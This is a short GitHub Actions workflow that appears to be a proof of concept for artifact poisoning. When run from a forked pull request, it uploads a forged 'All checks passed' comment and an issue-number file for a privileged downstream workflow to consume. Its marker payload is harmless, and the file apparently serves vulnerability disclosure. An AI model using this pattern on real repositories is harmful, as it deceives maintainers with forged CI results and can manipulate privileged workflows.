name: Health
on:
  pull_request:
    types: [opened, synchronize, reopened]

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled "summary" artifact from a FORK
        run: |
          mkdir -p output
          printf '%s\n' '## PR Health ✅' '' 'All checks passed. **Forked by the attacker** (poc-dartnative-fork-1).' > output/comment.md
          echo "${GITHUB_EVENT_NUMBER}" > output/issueNumber
        env:
          GITHUB_EVENT_NUMBER: ${{ github.event.number }}
      - uses: actions/upload-artifact@v4
        with:
          name: output
          path: output/
